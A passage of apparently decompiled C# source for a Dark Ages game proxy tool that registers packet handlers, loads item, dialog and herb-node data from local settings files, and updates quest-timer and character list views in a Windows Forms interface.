      Server.SpellList.Add("Frost Arrow 1", new SpellData("Frost Arrow 1", 700, 1));
      Server.SpellList.Add("Supernova Shot", new SpellData("Supernova Shot", 1500, 0));
      Server.SpellList.Add("Fiosachd Prayer", new SpellData("Fiosachd Prayer", 2, 1));
      Server.SpellList.Add("Glioca Prayer", new SpellData("Glioca Prayer", 2, 1));
      Server.SpellList.Add("Ceannlaidir Prayer", new SpellData("Ceannlaidir Prayer", 2, 1));
      Server.SpellList.Add("Deoch Prayer", new SpellData("Deoch Prayer", 2, 1));
      Server.SpellList.Add("Gramail Prayer", new SpellData("Gramail Prayer", 2, 1));
      Server.SpellList.Add("Cail Prayer", new SpellData("Cail Prayer", 2, 1));
      Server.SpellList.Add("Luathas Prayer", new SpellData("Luathas Prayer", 2, 1));
      Server.SpellList.Add("Sgrios Prayer", new SpellData("Sgrios Prayer", 2, 1));
      Server.StaticCharacters = new Dictionary<uint, Character>();
      Server.alarmTimer = DateTime.MinValue;
      Server.friendlist = new List<string>();
      Server.gmlist = new List<string>();
      Server.ignoreaislinglist = new List<string>();
      Server.CustomLoot = new List<int>();
      Server.IdentifyItems = new List<string>();
      Server.TrashList = new List<string>();
      Server.NeedsIdentifiedList = new List<string>();
      Server.NeedsIdentifiedList.Add("Leather Belt");
      Server.NeedsIdentifiedList.Add("Mythril Belt");
      Server.NeedsIdentifiedList.Add("Hy-brasyl Belt");
      Server.NeedsIdentifiedList.Add(" Boots");
      Server.NeedsIdentifiedList.Add("Boots");
      Server.NeedsIdentifiedList.Add("Gray Boots");
      Server.NeedsIdentifiedList.Add("Cured Boots");
      Server.NeedsIdentifiedList.Add("Shagreen Boots");
      Server.NeedsIdentifiedList.Add("Cordovan Boots");
      Server.NeedsIdentifiedList.Add("Lapis Boots");
      Server.NeedsIdentifiedList.Add("Saffian Boots");
      Server.NeedsIdentifiedList.Add("Magma Boots");
      Server.NeedsIdentifiedList.Add("Enchanted Boots");
      Server.NeedsIdentifiedList.Add("Beryl Earrings");
      Server.NeedsIdentifiedList.Add("Coral Earrings");
      Server.NeedsIdentifiedList.Add("Ruby Earrings");
      Server.NeedsIdentifiedList.Add("Silver Earrings");
      Server.NeedsIdentifiedList.Add("Gold Earrings");
      Server.NeedsIdentifiedList.Add("Leather Gauntlet");
      Server.NeedsIdentifiedList.Add("Iron Gauntlet");
      Server.NeedsIdentifiedList.Add("Mythril Gauntlet");
      Server.NeedsIdentifiedList.Add("Hy-brasyl Gauntlet");
      Server.NeedsIdentifiedList.Add("Leather Bracer");
      Server.NeedsIdentifiedList.Add("Iron Bracer");
      Server.NeedsIdentifiedList.Add("Mythril Bracer");
      Server.NeedsIdentifiedList.Add("Hy-brasyl Bracer");
      Server.NeedsIdentifiedList.Add("Leather Greaves");
      Server.NeedsIdentifiedList.Add("Iron Greaves");
      Server.NeedsIdentifiedList.Add("Mythril Greaves");
      Server.NeedsIdentifiedList.Add("Hy-brasyl Greaves");
      Server.NeedsIdentifiedList.Add("Pearl Necklace");
      Server.NeedsIdentifiedList.Add("Gold Jade Necklace");
      Server.NeedsIdentifiedList.Add("Jade Necklace");
      Server.NeedsIdentifiedList.Add("Amber Necklace");
      Server.NeedsIdentifiedList.Add("Bone Necklace");
      Server.NeedsIdentifiedList.Add("Talos Ring");
      Server.NeedsIdentifiedList.Add("Beryl Ring");
      Server.NeedsIdentifiedList.Add("Ruby Ring");
      Server.NeedsIdentifiedList.Add("Coral Ring");
      Server.NeedsIdentifiedList.Add("Lapis Ring");
      Server.NeedsIdentifiedList.Add("Grave Ring");
      Server.NeedsIdentifiedList.Add("Red Jade Ring");
      Server.NeedsIdentifiedList.Add("Amethyst Ring");
      Server.NeedsIdentifiedList.Add("Jade Ring");
      Server.NeedsIdentifiedList.Add("Wooden Shield");
      Server.NeedsIdentifiedList.Add("Leather Shield");
      Server.NeedsIdentifiedList.Add("Bronze Shield");
      Server.NeedsIdentifiedList.Add("Iron Shield");
      Server.NeedsIdentifiedList.Add("Mythril Shield");
      Server.NeedsIdentifiedList.Add("Hy-brasyl Shield");
      Server.NeedsIdentifiedList.Add("Talos Shield");
      Server.NeedsIdentifiedList.Add("Stilla");
      Server.NeedsIdentifiedList.Add("Long Sword");
      Server.NeedsIdentifiedList.Add("Two-handed Claidhmore");
      Server.NeedsIdentifiedList.Add("Two-handed Emerald Sword");
      Server.NeedsIdentifiedList.Add("Two-handed Gladius");
      Server.NeedsIdentifiedList.Add("Two-handed Kindjal");
      Server.NeedsIdentifiedList.Add("Light Dagger");
      Server.NeedsIdentifiedList.Add("Sun Dagger");
      Server.NeedsIdentifiedList.Add("Lotus Dagger");
      Server.NeedsIdentifiedList.Add("Lotus Secret");
      Server.NeedsIdentifiedList.Add("Light Secret");
      Server.NeedsIdentifiedList.Add("Sun Secret");
      Server.NeedsIdentifiedList.Add("Raw Beryl");
      Server.NeedsIdentifiedList.Add("Raw Coral");
      Server.NeedsIdentifiedList.Add("Raw Ruby");
      Server.NeedsIdentifiedList.Add("Raw Talgonite");
      Server.NeedsIdentifiedList.Add("Raw Hy-brasyl");
      Server.NeedsIdentifiedList.Add("Shocker Piece");
      Server.NeedsIdentifiedList.Add("Cowl");
      Server.NeedsIdentifiedList.Add("Galuchat Coat");
      Server.NeedsIdentifiedList.Add("Gardcorp");
      Server.NeedsIdentifiedList.Add("Journeyman");
      Server.NeedsIdentifiedList.Add("Dobok");
      Server.NeedsIdentifiedList.Add("Culotte");
      Server.NeedsIdentifiedList.Add("Leather Tunic");
      Server.NeedsIdentifiedList.Add("Jupe");
      Server.NeedsIdentifiedList.Add("Scout Leather");
      Server.NeedsIdentifiedList.Add("Dwarvish Leather");
      Server.NeedsIdentifiedList.Add("Cotte");
      Server.NeedsIdentifiedList.Add("Brigandine");
      Server.NeedsIdentifiedList.Add("Magi Skirt");
      Server.NeedsIdentifiedList.Add("Benusta");
      Server.NeedsIdentifiedList.Add("Gorget Gown");
      Server.NeedsIdentifiedList.Add("Mystic Gown");
      Server.NeedsIdentifiedList.Add("Earth Bodice");
      Server.NeedsIdentifiedList.Add("Lotus Bodice");
      Server.NeedsIdentifiedList.Add("Leather Bliaut");
      Server.NeedsIdentifiedList.Add("Cuirass");
      Server.AlertNonFriendTimer = new System.Timers.Timer(30000.0);
      Server.AlertNonFriendTimer.Elapsed += new ElapsedEventHandler(Server.AlertNonFriendOkay);
      Server.AlertNonFriendTimer.Enabled = true;
      Server.AlertNonFriendTimer.Stop();
      this.LoadTimedEvents();
      this.LoadGMList();
      this.LoadLists();
      this.ClientMessageHandlers = new ClientMessageHandler[256];
      this.ServerMessageHandlers = new ServerMessageHandler[256];
      for (int index = 0; index < this.ClientMessageHandlers.Length; ++index)
        this.ClientMessageHandlers[index] = (ClientMessageHandler) ((client, msg) => true);
      for (int index = 0; index < this.ServerMessageHandlers.Length; ++index)
        this.ServerMessageHandlers[index] = (ServerMessageHandler) ((client, msg) => true);
      this.ClientMessageHandlers[3] = new ClientMessageHandler(this.ClientMessage_0x03_LogIn);
      this.ClientMessageHandlers[6] = new ClientMessageHandler(this.ClientMessage_0x06_Walking);
      this.ClientMessageHandlers[8] = new ClientMessageHandler(this.ClientMessage_0x08_Drop);
      this.ClientMessageHandlers[11] = new ClientMessageHandler(this.ClientMessage_0x0B_LogOut);
      this.ClientMessageHandlers[14] = new ClientMessageHandler(this.ClientMessage_0x0E_Speak);
      this.ClientMessageHandlers[15] = new ClientMessageHandler(this.ClientMessage_0x0F_UseSpell);
      this.ClientMessageHandlers[16] = new ClientMessageHandler(this.ClientMessage_0x10_ClientJoin);
      this.ClientMessageHandlers[19] = new ClientMessageHandler(this.ClientMessage_0x13_Assail);
      this.ClientMessageHandlers[28] = new ClientMessageHandler(this.ClientMessage_0x1C_UseItem);
      this.ClientMessageHandlers[46] = new ClientMessageHandler(this.ClientMessage_0x2E_Group);
      this.ClientMessageHandlers[48] = new ClientMessageHandler(this.ClientMessage_0x30_SwapSlots);
      this.ClientMessageHandlers[57] = new ClientMessageHandler(this.ClientMessage_0x39_DialogueSelect);
      this.ClientMessageHandlers[58] = new ClientMessageHandler(this.ClientMessage_0x3A_PopupSelect);
      this.ClientMessageHandlers[59] = new ClientMessageHandler(this.ClientMessage_0x3B_BoardSelect);
      this.ClientMessageHandlers[62] = new ClientMessageHandler(this.ClientMessage_0x3E_UseSkill);
      this.ClientMessageHandlers[63] = new ClientMessageHandler(this.ClientMessage_0x3F_WorldMapSelect);
      this.ClientMessageHandlers[67] = new ClientMessageHandler(this.ClientMessage_0x43_ClickCharacter);
      this.ClientMessageHandlers[68] = new ClientMessageHandler(this.ClientMessage_0x44_UnequipGear);
      this.ClientMessageHandlers[77] = new ClientMessageHandler(this.ClientMessage_0x4D_SpellLines);
      this.ServerMessageHandlers[3] = new ServerMessageHandler(this.ServerMessage_0x03_Redirect);
      this.ServerMessageHandlers[4] = new ServerMessageHandler(this.ServerMessage_0x04_Location);
      this.ServerMessageHandlers[5] = new ServerMessageHandler(this.ServerMessage_0x05_PlayerID);
      this.ServerMessageHandlers[7] = new ServerMessageHandler(this.ServerMessage_0x07_DisplayNPC);
      this.ServerMessageHandlers[8] = new ServerMessageHandler(this.ServerMessage_0x08_Statistics);
      this.ServerMessageHandlers[10] = new ServerMessageHandler(this.ServerMessage_0x0A_SystemMessage);
      this.ServerMessageHandlers[11] = new ServerMessageHandler(this.ServerMessage_0x0B_MoveClient);
      this.ServerMessageHandlers[12] = new ServerMessageHandler(this.ServerMessage_0x0C_MoveCharacter);
      this.ServerMessageHandlers[13] = new ServerMessageHandler(this.ServerMessage_0x0D_Chat);
      this.ServerMessageHandlers[14] = new ServerMessageHandler(this.ServerMessage_0x0E_RemoveCharacter);
      this.ServerMessageHandlers[15] = new ServerMessageHandler(this.ServerMessage_0x0F_AddItem);
      this.ServerMessageHandlers[16] = new ServerMessageHandler(this.ServerMessage_0x10_RemoveItem);
      this.ServerMessageHandlers[17] = new ServerMessageHandler(this.ServerMessage_0x11_CharacterTurn);
      this.ServerMessageHandlers[19] = new ServerMessageHandler(this.ServerMessage_0x13_HpBar);
      this.ServerMessageHandlers[21] = new ServerMessageHandler(this.ServerMessage_0x15_MapInfo);
      this.ServerMessageHandlers[23] = new ServerMessageHandler(this.ServerMessage_0x17_AddSpell);
      this.ServerMessageHandlers[24] = new ServerMessageHandler(this.ServerMessage_0x18_RemoveSpell);
      this.ServerMessageHandlers[25] = new ServerMessageHandler(this.ServerMessage_0x19_SoundEffect);
      this.ServerMessageHandlers[26] = new ServerMessageHandler(this.ServerMessage_0x1A_BodyAnimation);
      this.ServerMessageHandlers[31] = new ServerMessageHandler(this.ServerMessage_0x1F_NewMap);
      this.ServerMessageHandlers[41] = new ServerMessageHandler(this.ServerMessage_0x29_SpellAnimation);
      this.ServerMessageHandlers[44] = new ServerMessageHandler(this.ServerMessage_0x2C_AddSkill);
      this.ServerMessageHandlers[45] = new ServerMessageHandler(this.ServerMessage_0x2D_RemoveSkill);
      this.ServerMessageHandlers[46] = new ServerMessageHandler(this.ServerMessage_0x2E_DisplayWorldMap);
      this.ServerMessageHandlers[47] = new ServerMessageHandler(this.ServerMessage_0x2F_DialogueResponse);
      this.ServerMessageHandlers[48] = new ServerMessageHandler(this.ServerMessage_0x30_PopupResponse);
      this.ServerMessageHandlers[49] = new ServerMessageHandler(this.ServerMessage_0x31_MailMenu);
      this.ServerMessageHandlers[51] = new ServerMessageHandler(this.ServerMessage_0x33_DisplayPlayer);
      this.ServerMessageHandlers[52] = new ServerMessageHandler(this.ServerMessage_0x34_Legend);
      this.ServerMessageHandlers[54] = new ServerMessageHandler(this.ServerMessage_0x36_CountryList);
      this.ServerMessageHandlers[55] = new ServerMessageHandler(this.ServerMessage_0x37_AddAppendage);
      this.ServerMessageHandlers[56] = new ServerMessageHandler(this.ServerMessage_0x38_RemoveAppendage);
      this.ServerMessageHandlers[57] = new ServerMessageHandler(this.ServerMessage_0x39_Profile);
      this.ServerMessageHandlers[58] = new ServerMessageHandler(this.ServerMessage_0x3A_SpellBar);
      this.ServerMessageHandlers[63] = new ServerMessageHandler(this.ServerMessage_0x3F_Cooldown);
      this.ServerMessageHandlers[66] = new ServerMessageHandler(this.ServerMessage_0x42_ExchangeWindow);
      this.ServerMessageHandlers[76] = new ServerMessageHandler(this.ServerMessage_0x4C_LogOffSignal);
      this.ServerMessageHandlers[96] = new ServerMessageHandler(this.ServerMessage_0x60_OK);
      this.ServerMessageHandlers[103] = new ServerMessageHandler(this.ServerMessage_0x67_WorldMapResponse);
      this.RemoteEndPoint = (EndPoint) new IPEndPoint(IPAddress.Parse("52.88.55.94"), 2610);
      this.ServerLoopThread = new Thread(new ThreadStart(this.ServerLoop));
      this.ServerLoopThread.Start();
      Server.TimedEvents = new Thread(new ThreadStart(this.EventsLoop));
      Server.TimedEvents.Start();
    }

    private void LoadScriptText()
    {
      string path = Program.StartupPath + "\\Settings\\scripttext.txt";
      if (!System.IO.File.Exists(path))
        return;
      StreamReader streamReader = new StreamReader(path);
      string str1;
      while ((str1 = streamReader.ReadLine()) != null)
      {
        string str2 = str1.Substring(0, str1.Length - 2);
        if (!Server.scriptTexts.Contains(str1) && !Server.scriptTexts.Contains(str2))
          Server.scriptTexts.Add(str1);
      }
      streamReader.Close();
    }

    private void CreateDialogList()
    {
      System.IO.File.WriteAllText(Program.StartupPath + "\\Settings\\dialogs.txt", "18 - Tutorial Exit\r\n70 - Mother's Love\r\n78 - The Letter\r\n79 - The Letter (Riona)\r\n80 - The Letter (Marlon)\r\n81 - The Letter (Baltasar)\r\n82 - The Letter (Library)\r\n83 - The Letter (Aoife)\r\n84 - The Letter (Frida)\r\n85 - The Letter (Duana)\r\n86 - The Letter (Lowell)\r\n87 - The Letter (Thibault)\r\n88 - The Letter (Courtney)\r\n108 - Harvest Conix\r\n147 - Path Reception\r\n160 - Warrior\r\n161 - Rogue\r\n162 - Wizard\r\n163 - Priest\r\n164 - Monk\r\n174 - Wake Up\r\n185 - Riona's Greeting\r\n204 - Loures Soldiers\r\n230 - Buy Fior\r\n231 - Buy Gem\r\n294 - Ancusa\r\n295 - Betony\r\n296 - Fifleaf\r\n297 - Hemloch\r\n298 - Hydele\r\n299 - Personaca\r\n300 - Nadurra Srad\r\n302 - Nadurra Athar\r\n304 - Nadurra Creag\r\n306 - Nadurra Sal\r\n311 - Labor\r\n312 - Mentor\r\n315 - Wizardry Research\r\n316 - Gem Polishing\r\n317 - Sword Smith\r\n319 - Male Tailoring\r\n320 - Female Tailoring\r\n381 - Higgle\r\n542 - Deoch Prayer\r\n543 - Glioca Prayer\r\n544 - Cail Prayer\r\n545 - Luathas Prayer\r\n546 - Gramail Prayer\r\n547 - Fiosachd Prayer\r\n548 - Ceannlaidir Prayer\r\n549 - Sgrios Prayer\r\n616 - From The Heart\r\n617 - Cycle of Becoming\r\n618 - Dancing Faerie\r\n619 - Enter Dark Chamber\r\n620 - Enter Heart of Stone\r\n626 - Deoch Toiseach\r\n627 - Gramail Toiseach\r\n669 - Master Stats\r\n703 - Tagor Welcome\r\n856 - Arena Exit\r\n922 - Leave Battle Ring\r\n1005 - Maze\r\n1019 - Giant Pearl\r\n1132 - Talisman\r\n1133 - Broken Talisman\r\n1154 - Dragon Scale Sword\r\n1157 - Giant Ant\r\n1158 - Fruits\r\n1159 - Red Mantis\r\n1160 - Mantis Stuff\r\n1166 - Creants\r\n1167 - I have the head\r\n1168 - I have the claw\r\n1194 - Goblin Disguise\r\n1300 - Express Ship\r\n1302 - Caravan to Noam\r\n1303 - Caravan to Asilon or Hwarone\r\n1304 - Carpet Merchant\r\n1350 - Enter Training Dojo\r\n1490 - Crystal Table\r\n1504 - Manor Key\r\n1560 - Item Shop Trade-In\r\n1650 - Swimming\r\n1687 - Item Removal\r\n2437 - Hostile Clothing\r\n2454 - Jovino");
    }

    private void LoadDialogList()
    {
      string path = Program.StartupPath + "\\Settings\\dialogs.txt";
      if (!System.IO.File.Exists(path))
        this.CreateDialogList();
      StreamReader streamReader = new StreamReader(path);
      string str;
      while ((str = streamReader.ReadLine()) != null)
        Server.Dialogs.Add(str.Substring(str.IndexOf(" - ") + 3), ushort.Parse(str.Substring(0, str.IndexOf(" - "))));
      streamReader.Close();
    }

    public void Loadgamenpcs()
    {
      if (!System.IO.File.Exists("C:\\Users\\Russ\\Desktop\\npcs.json"))
        ;
    }

    public void Savegamemaps(Client client)
    {
      if (!client.Tab.recordmaps.Checked || !System.IO.File.Exists("C:\\Users\\Russ\\Desktop\\maps.json"))
        ;
    }

    public void Loadgamemaps()
    {
      if (!System.IO.File.Exists("C:\\Users\\Russ\\Desktop\\maps.json"))
        ;
    }

    public void PopulateSenseMonsters()
    {
    }

    public void PopulateNodes()
    {
      string str1 = Program.StartupPath + "\\Settings\\HerbNodes.xml";
      if (!System.IO.File.Exists(str1))
        return;
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.Load(str1);
      foreach (XmlElement childNode in xmlDocument.DocumentElement.ChildNodes)
      {
        if (childNode.InnerText != string.Empty)
        {
          string[] strArray = childNode.InnerText.Split(',');
          int x = int.Parse(strArray[0]);
          int y = int.Parse(strArray[1]);
          int num = int.Parse(strArray[2]);
          string str2 = childNode.Value;
          Location location = new Location(x, y);
          HerbNode herbNode = new HerbNode();
          herbNode.Type = str2;
          herbNode.Location.X = x;
          herbNode.Location.Y = y;
          herbNode.Map = num;
          herbNode.Active = true;
          if (childNode.Name == "Hydele" && !Server.HydeleNodes.ContainsKey(childNode.InnerText))
            Server.HydeleNodes.Add(childNode.InnerText, herbNode);
          else if (childNode.Name == "Betony" && !Server.BetonyNodes.ContainsKey(childNode.InnerText))
            Server.BetonyNodes.Add(childNode.InnerText, herbNode);
          else if (childNode.Name == "Personaca" && !Server.PersonacaNodes.ContainsKey(childNode.InnerText))
            Server.PersonacaNodes.Add(childNode.InnerText, herbNode);
          else if (childNode.Name != "Personaca" && childNode.Name != "Hydele" && childNode.Name != "Betony" && !Server.HerbNodes.ContainsKey(childNode.InnerText))
            Server.HerbNodes.Add(childNode.InnerText, herbNode);
        }
      }
    }

    public void PopulateChestDatabase()
    {
      string str = Program.StartupPath + "\\Settings\\ItemDatabase\\treasurechests.xml";
      if (!System.IO.File.Exists(str))
        return;
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.Load(str);
      foreach (XmlElement childNode1 in xmlDocument.DocumentElement.ChildNodes)
      {
        ChestItemXML chestItemXml = new ChestItemXML("Andor Chest", 0U);
        foreach (XmlElement childNode2 in childNode1.ChildNodes)
        {
          if (childNode2.Name == "ChestName")
            chestItemXml.Name = childNode2.InnerText;
          else if (childNode2.Name == "Opened")
            chestItemXml.OpenedCount = uint.Parse(childNode2.InnerText);
          else if (childNode2.Name == "Item")
          {
            string key = "";
            int num = 0;
            foreach (XmlElement childNode3 in childNode2.ChildNodes)
            {
              if (childNode3.Name == "ItemName")
                key = childNode3.InnerText;
              else if (childNode3.Name == "DropCount")
                num = int.Parse(childNode3.InnerText);
            }
            chestItemXml.Treasure.Add(key, num);
          }
        }
        if (!Server.ChestDatabase.ContainsKey(chestItemXml.Name))
          Server.ChestDatabase.Add(chestItemXml.Name, chestItemXml);
        else
          Server.ChestDatabase[chestItemXml.Name] = chestItemXml;
      }
    }

    public void PopulateItemDatabase()
    {
      string str1 = Program.StartupPath + "\\Settings\\ItemDatabase.xml";
      if (!System.IO.File.Exists(str1))
        return;
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.Load(str1);
      foreach (XmlElement childNode1 in xmlDocument.DocumentElement.ChildNodes)
      {
        ItemXML itemXml = new ItemXML();
        foreach (XmlElement childNode2 in childNode1.ChildNodes)
        {
          if (childNode2.Name == "Name")
            itemXml.Name = childNode2.InnerText;
          else if (childNode2.Name == "SecondName")
            itemXml.SecondName = childNode2.InnerText;
          else if (childNode2.Name == "Image" && childNode2.InnerText != string.Empty)
            itemXml.Image = int.Parse(childNode2.InnerText);
          else if (childNode2.Name == "Usedfor")
          {
            string[] strArray = childNode2.InnerText.Split('\n');
            if (strArray.Length > 0)
            {
              foreach (string str2 in strArray)
              {
                if (str2 != string.Empty)
                  itemXml.Usedfor.Add(str2.Trim());
              }
            }
          }
          else if (childNode2.Name == "Obtainedby")
          {
            string[] strArray = childNode2.InnerText.Split('\n');
            if (strArray.Length > 0)
            {
              foreach (string str2 in strArray)
              {
                if (str2 != string.Empty)
                  itemXml.Obtainedby.Add(str2.Trim());
              }
            }
          }
        }
        Server.ItemDatabase.Add(itemXml.Name, itemXml);
      }
    }

    private void EventsLoop()
    {
      while (true)
      {
        this.PopulateSkullListView();
        this.PopulateTasksListView();
        Thread.Sleep(1000);
      }
    }

    public void PopulateAscendLogListView(AscendData z)
    {
      if (Server.AscendLog.Count<AscendData>() <= 0 || z == null)
        return;
      Program.MainForm.ascensionlistview.BeginUpdate();
      Program.MainForm.ascensionlistview.Items.Insert(0, new ListViewItem(z.Time)
      {
        SubItems = {
          z.Name,
          z.EXP,
          z.Increase
        }
      });
      Program.MainForm.ascensionlistview.EndUpdate();
    }

    public void SaveAscendLog()
    {
      XDocument xdocument = new XDocument();
      xdocument.Add((object) new XElement((XName) "Ascended"));
      foreach (AscendData ascendData in Server.AscendLog)
        xdocument.Element((XName) "Ascended").Add((object) new XElement((XName) "Char", (object) (ascendData.Time + "|" + ascendData.Name + "|" + ascendData.EXP + "|" + ascendData.Increase)));
      xdocument.Save(Program.StartupPath + "\\Settings\\Ascended.xml");
    }

    public void LoadAscendLog()
    {
      if (!Directory.Exists(Program.StartupPath + "\\Settings"))
        return;
      if (!System.IO.File.Exists(Program.StartupPath + "\\Settings\\Ascended.xml"))
      {
        System.IO.File.Create(Program.StartupPath + "\\Settings\\Ascended.xml").Close();
        XDocument xdocument = new XDocument();
        xdocument.Add((object) new XElement((XName) "Ascended"));
        xdocument.Save(Program.StartupPath + "\\Settings\\Ascended.xml");
      }
      try
      {
        foreach (XElement element in XDocument.Load(Program.StartupPath + "\\Settings\\Ascended.xml").Element((XName) "Ascended").Elements((XName) "Char"))
        {
          string[] strArray = element.Value.Split('|');
          AscendData z = new AscendData();
          z.Time = strArray[0];
          z.Name = strArray[1];
          z.EXP = strArray[2];
          z.Increase = strArray[3];
          Server.AscendLog.Add(z);
          this.PopulateAscendLogListView(z);
        }
      }
      catch
      {
        XDocument xdocument = new XDocument();
        xdocument.Add((object) new XElement((XName) "Ascended"));
        xdocument.Save(Program.StartupPath + "\\Settings\\Ascended.xml");
      }
    }

    public void PopulateSkullListView()
    {
      if (Server.SkullList.Count<KeyValuePair<string, SkullData>>() <= 0)
        return;
      foreach (SkullData skullData in Server.SkullList.Values.ToArray<SkullData>())
      {
        if (Server.SkullList.ContainsKey(skullData.Name) && skullData != null)
        {
          if (!Program.MainForm.skulledlistview.Items.ContainsKey(skullData.Name))
          {
            Program.MainForm.skulledlistview.BeginUpdate();
            ListViewItem listViewItem = Program.MainForm.skulledlistview.Items.Add(skullData.Name, skullData.Name, -1);
            listViewItem.SubItems.Add(skullData.Map);
            listViewItem.SubItems.Add(skullData.XY);
            Program.MainForm.skulledlistview.EndUpdate();
          }
          else if (Program.MainForm.skulledlistview.Items[skullData.Name] != null)
          {
            Program.MainForm.skulledlistview.BeginUpdate();
            Program.MainForm.skulledlistview.Items[skullData.Name].SubItems[1].Text = skullData.Map;
            Program.MainForm.skulledlistview.Items[skullData.Name].SubItems[2].Text = skullData.XY;
            Program.MainForm.skulledlistview.EndUpdate();
          }
        }
      }
    }

    public void SaveSkullList()
    {
      XDocument xdocument = new XDocument();
      xdocument.Add((object) new XElement((XName) "Skulled"));
      foreach (SkullData skullData in Server.SkullList.Values)
        xdocument.Element((XName) "Skulled").Add((object) new XElement((XName) "Char", (object) (skullData.Name + "|" + skullData.Map + "|" + skullData.XY)));
      xdocument.Save(Program.StartupPath + "\\Settings\\skulled.xml");
    }

    public void LoadSkullList()
    {
      if (!Directory.Exists(Program.StartupPath + "\\Settings"))
        return;
      if (!System.IO.File.Exists(Program.StartupPath + "\\Settings\\skulled.xml"))
      {
        System.IO.File.Create(Program.StartupPath + "\\Settings\\skulled.xml").Close();
        XDocument xdocument = new XDocument();
        xdocument.Add((object) new XElement((XName) "Skulled"));
        xdocument.Save(Program.StartupPath + "\\Settings\\skulled.xml");
      }
      try
      {
        foreach (XElement element in XDocument.Load(Program.StartupPath + "\\Settings\\skulled.xml").Element((XName) "Skulled").Elements((XName) "Char"))
        {
          string[] strArray = element.Value.Split('|');
          SkullData skullData = new SkullData();
          skullData.Name = strArray[0];
          skullData.Map = strArray[1];
          skullData.XY = strArray[2];
          if (!Server.SkullList.ContainsKey(skullData.Name))
            Server.SkullList.Add(skullData.Name, skullData);
          else
            Server.SkullList[skullData.Name] = skullData;
        }
      }
      catch
      {
        XDocument xdocument = new XDocument();
        xdocument.Add((object) new XElement((XName) "Skulled"));
        xdocument.Save(Program.StartupPath + "\\Settings\\skulled.xml");
      }
    }

    public void PopulateTasksListView()
    {
      if (Server.TimedEvent.Count<KeyValuePair<string, ProxyBase.TimedEvent>>() <= 0)
        return;
      foreach (ProxyBase.TimedEvent timedEvent in (IEnumerable<ProxyBase.TimedEvent>) ((IEnumerable<ProxyBase.TimedEvent>) Server.TimedEvent.Values.ToArray<ProxyBase.TimedEvent>()).OrderBy<ProxyBase.TimedEvent, uint>((Func<ProxyBase.TimedEvent, uint>) (z => z.TimeLeft())))
      {
        if (Server.TimedEvent.ContainsKey(timedEvent.Name + timedEvent.Event) && timedEvent != null)
        {
          if (Program.MainForm.TaskFilter.Text != "All" && Program.MainForm.TaskFilter.Text != timedEvent.Event)
          {
            if (Program.MainForm.recenttaskslist.Items.ContainsKey(timedEvent.Name + timedEvent.Event) && Program.MainForm.recenttaskslist.Items[timedEvent.Name + timedEvent.Event] != null)
            {
              Program.MainForm.recenttaskslist.BeginUpdate();
              Program.MainForm.recenttaskslist.Items[timedEvent.Name + timedEvent.Event].Remove();
              Program.MainForm.recenttaskslist.EndUpdate();
            }
          }
          else if (!timedEvent.Track && !Program.MainForm.showall.Checked)
          {
            if (Program.MainForm.recenttaskslist.Items.ContainsKey(timedEvent.Name + timedEvent.Event) && Program.MainForm.recenttaskslist.Items[timedEvent.Name + timedEvent.Event] != null)
            {
              Program.MainForm.recenttaskslist.BeginUpdate();
              Program.MainForm.recenttaskslist.Items[timedEvent.Name + timedEvent.Event].Remove();
              Program.MainForm.recenttaskslist.EndUpdate();
            }
          }
          else
          {
            if (timedEvent.TimeLeft() == 0U && timedEvent.Track && !timedEvent.Messaged && Server.Alts.Values.Count<Client>() > 0)
            {
              foreach (Client client in Server.Alts.Values.ToArray<Client>())
              {
                if (client != null && client.LoggedOn)
                {
                  string titleCase = CultureInfo.CurrentCulture.TextInfo.ToTitleCase(timedEvent.Name);
                  client.SendMessage(titleCase + " can repeat: " + timedEvent.Event + "!", "pink", false);
                  timedEvent.Messaged = true;
                }
              }
            }
            if (!Program.MainForm.recenttaskslist.Items.ContainsKey(timedEvent.Name + timedEvent.Event))
            {
              string text = "Quest Available!";
              double num = (double) timedEvent.TimeLeft();
              if (num <= 1.0 && num != 0.0)
                text = "<1 min";
              else if (num <= 60.0 && num != 0.0)
                text = ((int) num).ToString() + " mins";
              else if (num >= 1440.0)
                text = ((int) Math.Floor(num / 1440.0)).ToString() + " days " + (object) (int) Math.Floor(num % 1440.0 / 60.0) + " hrs " + (object) (int) Math.Floor(num % 60.0) + " mins";
              else if (num >= 60.0)
                text = ((int) Math.Floor(num / 60.0)).ToString() + " hrs " + (object) (int) Math.Floor(num % 60.0) + " mins";
              Program.MainForm.recenttaskslist.BeginUpdate();
              ListViewItem listViewItem = Program.MainForm.recenttaskslist.Items.Add(timedEvent.Name + timedEvent.Event, timedEvent.Name, -1);
              listViewItem.SubItems.Add(timedEvent.Event);
              listViewItem.SubItems.Add(text);
              listViewItem.Checked = timedEvent.Track;
              Program.MainForm.recenttaskslist.EndUpdate();
            }
            else if (Program.MainForm.recenttaskslist.Items[timedEvent.Name + timedEvent.Event] != null)
            {
              string str = "Quest Available!";
              double num = (double) timedEvent.TimeLeft();
              if (num <= 1.0 && num != 0.0)
                str = "<1 min";
              else if (num <= 60.0 && num != 0.0)
                str = ((int) num).ToString() + " mins";
              else if (num >= 1440.0)
                str = ((int) Math.Floor(num / 1440.0)).ToString() + " days " + (object) (int) Math.Floor(num % 1440.0 / 60.0) + " hrs " + (object) (int) Math.Floor(num % 60.0) + " mins";
              else if (num >= 60.0)
                str = ((int) Math.Floor(num / 60.0)).ToString() + " hrs " + (object) (int) Math.Floor(num % 60.0) + " mins";
              if (str != Program.MainForm.recenttaskslist.Items[timedEvent.Name + timedEvent.Event].SubItems[2].Text)
              {
                Program.MainForm.recenttaskslist.BeginUpdate();
                Program.MainForm.recenttaskslist.Items[timedEvent.Name + timedEvent.Event].SubItems[2].Text = str;
                Program.MainForm.recenttaskslist.EndUpdate();
              }
            }
          }
        }
      }
    }

    public void SaveTasksList()
    {
      XDocument xdocument = new XDocument();
      xdocument.Add((object) new XElement((XName) "TimedEvents"));
      foreach (ProxyBase.TimedEvent timedEvent in Server.TimedEvent.Values)
        xdocument.Element((XName) "TimedEvents").Add((object) new XElement((XName) "Event", (object) (timedEvent.Name + "|" + timedEvent.Event + "|" + (object) timedEvent.Time + "|" + (object) timedEvent.Track)));
      if (xdocument.Nodes().Count<XNode>() <= 0 || Server.TimedEvent.Values.Count <= 0 || !xdocument.Element((XName) "TimedEvents").HasElements)
        return;
      xdocument.Save(Program.StartupPath + "\\Settings\\timedevents.xml");
    }

    public void LoadTasksList()
    {
      if (!Directory.Exists(Program.StartupPath + "\\Settings"))
        return;
